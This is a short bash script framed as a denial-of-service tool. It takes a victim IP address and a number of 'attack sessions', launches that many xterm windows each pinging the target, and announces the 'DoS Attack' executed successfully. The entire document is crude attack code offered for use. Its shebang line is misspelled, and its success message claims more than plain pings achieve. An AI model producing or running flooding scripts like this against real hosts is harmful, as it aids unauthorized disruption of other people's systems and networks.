#l/bin/bash

if [[ ($1 = "" ) || ($2 = "" ) ]]; then
	echo "Script usage is: $0 IP_Address_Of_Victim Num_Of_Attack_Session"
	exit
else
	for (( i = 1; i <= $2; i++ )); do
		xterm -e ping $1 &
	done
fi
echo "DoS Attack to [$1] with  $2 attackers executed successfully!"
